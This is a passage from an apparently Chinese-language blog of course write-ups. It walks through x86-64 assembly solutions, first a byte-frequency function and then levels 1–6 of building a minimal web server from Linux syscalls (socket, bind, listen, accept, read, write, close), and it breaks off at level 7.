0x403000</span><br><span class="line">  call rdx  # call后不能直接加地址，需要寄存器作为中转</span><br><span class="line">  pop rdi # 回复 rdi 的值</span><br><span class="line">  mov [rdi], al</span><br><span class="line">  add rbx, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">  mov rax, rbx</span><br><span class="line">  ret</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level30：函数栈帧</p>
<p>伪代码：</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">most_common_byte(src_addr, size):</span><br><span class="line">  i = 0</span><br><span class="line">  while i &lt;= size-1:</span><br><span class="line">    curr_byte = [src_addr + i]</span><br><span class="line">    [stack_base - curr_byte] += 1</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">  b = 0</span><br><span class="line">  max_freq = 0</span><br><span class="line">  max_freq_byte = 0</span><br><span class="line">  while b &lt;= 0xff:</span><br><span class="line">    if [stack_base - b] &gt; max_freq:</span><br><span class="line">      max_freq = [stack_base - b]</span><br><span class="line">      max_freq_byte = b</span><br><span class="line">    b += 1</span><br><span class="line"></span><br><span class="line">  return max_freq_byte</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>WP：（两个参数分别是
rdi，rsi）参考https://www.freebuf.com/articles/database/321326.html</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">push 0                      # 预留一个空位，确保栈对齐 (因为数组下标从0开始，但是栈顶有其他数据，所以需要先push)</span><br><span class="line">mov rbp, rsp                # 保存当前的栈顶指针</span><br><span class="line">mov rax, -1                 # 初始化索引为 -1</span><br><span class="line">sub rsi, 1                  # 数组大小减 1</span><br><span class="line">sub rsp, rsi                # 为数组分配栈空间</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">    add rax, 1              # 索引加 1</span><br><span class="line">    cmp rax, rsi            # 比较 rax 和 rsi</span><br><span class="line">    jg next                 # 如果 rax &gt; rsi，跳转到 next</span><br><span class="line">    nop</span><br><span class="line">    mov cl, [rdi + rax]     # 取数组中的当前字节 curr_byte</span><br><span class="line">    mov r11, rbp            # 将 rbp 移动到 r11 中</span><br><span class="line">    sub r11, rcx            # 计算栈基地址减去 curr_byte 的地址</span><br><span class="line">    mov dl, [r11]           # 取该地址的值</span><br><span class="line">    add dl, 1               # 计数加 1</span><br><span class="line">    mov [r11], dl           # 存回该地址</span><br><span class="line">    jmp loop1               # 循环</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">mov rax, 0                  # 初始化 rax 为 0</span><br><span class="line">mov rbx, rax                # 初始化 rbx 为 0</span><br><span class="line">mov rcx, rax                # 初始化 rcx 为 0</span><br><span class="line">mov ax, -1                  # 初始化 ax 为 -1</span><br><span class="line"></span><br><span class="line">loop2:</span><br><span class="line">    add ax, 1               # b 加 1</span><br><span class="line">    cmp ax, 0xff            # 比较 b 和 0xff</span><br><span class="line">    jg return               # 如果 b &gt; 0xff，跳转到 return</span><br><span class="line">    nop</span><br><span class="line">    mov r11, rbp            # 将 rbp 移动到 r11 中</span><br><span class="line">    sub r11, rax            # 计算栈基地址减去 b 的地址</span><br><span class="line">    mov dl, [r11]           # 取该地址的值</span><br><span class="line">    cmp dl, bl              # 比较该地址的值和 max_freq</span><br><span class="line">    jle loop2               # 如果该值 &lt;= max_freq，跳转到 loop2</span><br><span class="line">    nop</span><br><span class="line">    mov bl, dl              # 否则更新 max_freq</span><br><span class="line">    mov cl, al              # 更新 max_freq_byte</span><br><span class="line">    jmp loop2               # 循环</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">return:</span><br><span class="line">mov rax, rcx                # 返回 max_freq_byte</span><br><span class="line">mov rsp, rbp                # 恢复栈顶指针</span><br><span class="line">pop rbx                     # 弹出预留的空位</span><br><span class="line">ret                         # 返回</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ul>
<h2 id="building-a-web-server">Building a Web Server</h2>
<h3 id="知识点-2">知识点</h3>
<ul>
<li><p>syscall（系统调用），用户通过系统调用访问内核提供的服务从而能够间接控制硬件</p>
<p>https://x64.syscall.sh/
可查看详细的系统调用函数，每个参数对应不同的<strong>寄存器</strong></p></li>
<li><p>network system call：</p>
<ul>
<li><code>int socket(int domain, int type, int protocal)</code>：socket()
creates an endpoint for communication and returns a file descriptor that
refers to that endpoint.（即该函数返回 sockfd）</li>
<li><code>int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen)</code>：将地址分配给socket</li>
<li><code>int listen(int sockfd, int backlog)</code>：将对应的 socket
标记为 passive(被动)
socket，被动套接字被用于连接请求（利用accept函数）</li>
<li><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)</code>：连接
socket，并创建新的 sockfd</li>
</ul></li>
<li><p><code>fork()</code>系统调用创建新的子进程，调用
<code>fork()</code>
后，会产生<strong>两个返回值</strong>，一个（子进程ID）在父进程中返回，另一个（0）在子进程中返回。下面是一个示例：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">pid_t</span> pid = fork(); <span class="comment">// 创建一个新进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// fork() 调用失败</span></span><br><span class="line">        perror(<span class="string">"fork failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// 这是子进程中执行的代码，getpid()获取是当前进程ID（即子进程ID）</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This is the child process. PID: %d\n"</span>, getpid());</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// 这是父进程中执行的代码，pid为子进程ID</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This is the parent process. Parent PID: %d  Child PID: %d\n"</span>, getpid(), pid);</span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 等待子进程结束</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>父进程和子进程共享文件描述符，但拥有独立的内存空间。若父进程通过
close 关闭了某文件，子进程不受影响</p>
</blockquote></li>
<li><p><code>close(int fd)</code>系统调用：关闭文件</p></li>
<li><p>总结：</p>
<blockquote>
<ul>
<li><p>使用 <code>socket()</code> 创建一个 TCP 套接字。</p></li>
<li><p>使用 <code>bind()</code>
将套接字绑定到指定的地址和端口。</p></li>
<li><p>使用 <code>listen()</code> 开始监听传入的连接。</p></li>
<li><p>使用 <code>accept()</code>
接受客户端连接，这会创建一个新的套接字来处理客户端通信。</p></li>
</ul>
</blockquote></li>
</ul>
<h3 id="练习-2">练习</h3>
<ul>
<li><p>level1：程序退出。</p>
<p>wp：直接运行默认给出的步骤</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit（这一步可查表 https://x64.syscall.sh/）</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：创建一个套接字。</p>
<p>wp：这题没给提示<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，参考教学视频里的代码<code>socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</code>，但是汇编语言无法识别这些字符串，需要找到<strong>对应的整数值</strong>，这里需要阅读Linux的源码。</p>
<p><strong>Linux源码阅读网站</strong>：https://elixir.bootlin.com/linux/latest/source</p>
<p>三个参数对应的整数值如下(分别位于在三个文件中)：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// domain 用于确定协议族</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC	0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX		1	<span class="comment">/* Unix domain sockets 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LOCAL	1	<span class="comment">/* POSIX name for AF_UNIX	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET		2	<span class="comment">/* Internet IP Protocol 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_AX25		3	<span class="comment">/* Amateur Radio AX.25 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX		4	<span class="comment">/* Novell IPX 			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK	5	<span class="comment">/* AppleTalk DDP 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETROM	6	<span class="comment">/* Amateur Radio NET/ROM 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BRIDGE	7	<span class="comment">/* Multiprotocol bridge 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMPVC	8	<span class="comment">/* ATM PVCs			*/</span></span></span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// type</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sock_type</span> {</span></span><br><span class="line">	SOCK_STREAM	= <span class="number">1</span>,</span><br><span class="line">	SOCK_DGRAM	= <span class="number">2</span>,</span><br><span class="line">	SOCK_RAW	= <span class="number">3</span>,</span><br><span class="line">	SOCK_RDM	= <span class="number">4</span>,</span><br><span class="line">	SOCK_SEQPACKET	= <span class="number">5</span>,</span><br><span class="line">	SOCK_DCCP	= <span class="number">6</span>,</span><br><span class="line">	SOCK_PACKET	= <span class="number">10</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// protocol</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> {</span></span><br><span class="line">  IPPROTO_IP = <span class="number">0</span>,		<span class="comment">/* Dummy protocol for TCP		*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IP		IPPROTO_IP</span></span><br><span class="line">  IPPROTO_ICMP = <span class="number">1</span>,		<span class="comment">/* Internet Control Message Protocol	*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_ICMP		IPPROTO_ICMP</span></span><br><span class="line">  IPPROTO_IGMP = <span class="number">2</span>,		<span class="comment">/* Internet Group Management Protocol	*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IGMP		IPPROTO_IGMP</span></span><br><span class="line">  IPPROTO_IPIP = <span class="number">4</span>,		<span class="comment">/* IPIP tunnels (older KA9Q tunnels use 94) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IPIP		IPPROTO_IPIP</span></span><br><span class="line">  IPPROTO_TCP = <span class="number">6</span>,		<span class="comment">/* Transmission Control Protocol	*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_TCP		IPPROTO_TCP</span></span><br><span class="line">  IPPROTO_UDP = <span class="number">17</span>,		<span class="comment">/* User Datagram Protocol		*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_UDP		IPPROTO_UDP</span></span><br><span class="line">... <span class="comment">// 省略了很多</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>该题的完整代码如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0     # 将 protocol 参数设置为 0，它意味着使用默认协议。对于 AF_INET 和 SOCK_STREAM 的组合，默认协议就是 TCP；或者直接明确协议，将参数设为 6</span><br><span class="line">    mov rax, 41    # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 0  # 注意要退出程序</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：使用
bind（<code>int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen)</code>）为socket分配地址和端口。</p>
<p>wp：运行<code>/challeng/run</code>还是啥提示都没有，直接运行<code>/challenge/run ./server</code>，得到</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure>
<p>发现需要绑定的端口和地址，下面分析结构体<code>sockaddr</code>和<code>sockaddr_in</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> {</span></span><br><span class="line">    <span class="type">sa_family_t</span> sa_family;  <span class="comment">// address family, e.g., AF_INET, AF_INET6</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];       <span class="comment">// protocol address</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> {</span></span><br><span class="line">    <span class="type">sa_family_t</span>    sin_family;  <span class="comment">// address family: AF_INET  （2字节）</span></span><br><span class="line">    <span class="type">in_port_t</span>      sin_port;    <span class="comment">// port in network byte order  （2字节）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>    <span class="comment">// internet address          （4字节）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>  sin_zero[<span class="number">8</span>]; <span class="comment">// padding to match sizeof(struct sockaddr)  （8字节）</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">// 由上述结构体可知 addrlen 默认为 16</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>这题使用的是 <code>sockaddr_in</code>，<code>sockaddr_in</code> 是
<code>sockaddr</code> 结构的一个具体版本，专门用于 IPv4
地址族。这里使用栈来存放结构体的参数，<strong>注意字节顺序</strong>，然后返回<code>rsp</code>作为指针</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0  # 填充字节</span><br><span class="line">    push 0x0000000050000002  # 实际内存中的顺序为：0200（2） 0050（80） 00000000（0.0.0.0）</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp   # 传入结构体指针</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：<code>int listen(int sockfd, int backlog)</code>
利用listen监听socket（backlog参数表示队列大小）</p>
<p>listen详解参考：https://xiaoxiami.gitbook.io/linux-server/socket/socket-xiang-guan-han-shu/shi-yong-listen-he-accept-han-shu</p>
<p>wp：通过运行<code>/challenge/run ./server</code>得到<code>listen(3, 0) = 0</code>，两个参数即可，第一个参数就是socket对应的整数值<code>socketfd</code>，正好level3中的<code>bind</code>操作将<code>socketfd</code>传给了<code>rdi</code>，因此可以省略这一步，直接设置第二个参数即可</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0  # 这里没有设置rdi，因为该参数与上一个rdi相同</span><br><span class="line">    mov rax, 50 # listen</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：接受连接。</p>
<p>wp：根据提示<code>accept(3, NULL, NULL)</code>，将后两个参数设置为0。将后两个参数设为null，服务器接受客户端连接时不会存储客户端的地址信息</p>
<blockquote>
<p><code>bind</code> 函数中的 <code>&amp;address</code>
用于指定服务器的地址信息（IP 和端口），以绑定套接字。</p>
<p><code>accept</code> 函数中的 <code>&amp;address</code>
用于接收客户端的地址信息（IP
和端口），以识别哪个客户端连接到了服务器。</p>
</blockquote>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6：静态响应HTTP请求</p>
<p>wp：根据下面的提示完善程序</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ ] accept(<span class="number">3</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) = <span class="number">4</span></span><br><span class="line">[ ] read(<span class="number">4</span>, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] write(<span class="number">4</span>, <span class="string">"HTTP/1.0 200 OK\r\n\r\n"</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">[ ] close(<span class="number">4</span>) = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>这里主要涉及到汇编代码的编写，其中注意 <code>lea</code>
的用法，可获取变量的地址。这里 <code>read</code>
的作用是尝试从某个文件描述符（由 <code>accept</code>
系统调用返回的套接字描述符
<code>rax</code>）读取数据，并将读取的数据存储到 <code>array</code>
缓冲区中。通常情况下，这个操作用于读取客户端通过网络发送给服务器的数据。下面只展示重要的代码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 accept 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">server.s                                                        </span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7：动态响应HTTP请求，要求如下：</p>
